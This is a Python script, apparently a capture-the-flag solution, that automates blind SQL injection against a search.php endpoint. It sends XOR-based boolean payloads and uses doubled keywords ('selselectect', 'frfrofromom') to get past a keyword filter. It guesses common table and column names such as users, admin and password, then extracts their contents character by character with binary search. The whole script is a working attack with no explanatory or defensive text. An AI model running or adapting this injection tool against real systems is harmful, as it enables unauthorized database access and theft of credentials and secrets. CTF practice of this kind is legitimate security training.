#!/usr/bin/env python3
import requests
import time
import string

URL = "http://68321904-15be-4b49-9f6a-508fbe5d863a.node5.buuoj.cn:81/search.php"
DELAY = 0.3

def test_condition(condition):
    """Test if condition is true using XOR blind injection"""
    payload = f"1^({condition})"
    try:
        r = requests.get(URL, params={"id": payload}, timeout=10)
        time.sleep(DELAY)
        # ERROR = condition is true (1^1=0, id=0 returns ERROR)
        # "NO! Not this!" = condition is false (1^0=1, id=1)
        return "ERROR" in r.text
    except Exception as e:
        print(f"[ERROR] {e}")
        time.sleep(5)
        return None

def extract_string(query, max_len=100):
    """Extract string using binary search"""
    result = ""

    # First find length
    length = None
    for l in range(1, max_len + 1):
        if test_condition(f"length({query})={l}"):
            length = l
            print(f"[+] Length of {query}: {length}")
            break

    if not length:
        print(f"[-] Could not determine length of {query}")
        return ""

    # Extract each character using binary search
    for pos in range(1, length + 1):
        low = 32
        high = 127

        while low < high:
            mid = (low + high) // 2
            if test_condition(f"ascii(substr({query},{pos},1))>{mid}"):
                low = mid + 1
            else:
                high = mid

        char = chr(low)
        result += char
        print(f"[+] Extracted: {result}")

    return result

def check_table_exists(table_name):
    """Check if a table exists in the database"""
    # Try to select 1 from the table
    query = f"selselectect(1)frfrofromom({table_name})"
    return test_condition(f"length(({query}))>0")

def check_column_exists(table_name, column_name):
    """Check if a column exists in a table"""
    query = f"selselectect({column_name})frfrofromom({table_name})"
    return test_condition(f"length(({query}))>0")

# Common table names to try
common_tables = [
    "flag", "flags", "fl4g", "fl4gs", "f1ag", "f14g",
    "secret", "secrets", "s3cret", "s3crets",
    "users", "user", "admin", "admins", "administrator",
    "config", "configs", "settings", "setting",
    "data", "info", "information",
    "ctf", "ctfs", "challenge", "challenges",
    "test", "testing", "tmp", "temp"
]

print("[*] Testing common table names...")
for table in common_tables:
    if check_table_exists(table):
        print(f"[+] Found table: {table}")
        # Try to extract data
        # First, try common column names
        common_columns = ["flag", "flags", "fl4g", "fl4gs", "f1ag", "secret", "password", "data", "value", "content", "id", "name"]
        for col in common_columns:
            if check_column_exists(table, col):
                print(f"[+] Found column {col} in table {table}")
                data = extract_string(f"selselectect({col})frfrofromom({table})")
                print(f"[+] Data from {table}.{col}: {data}")
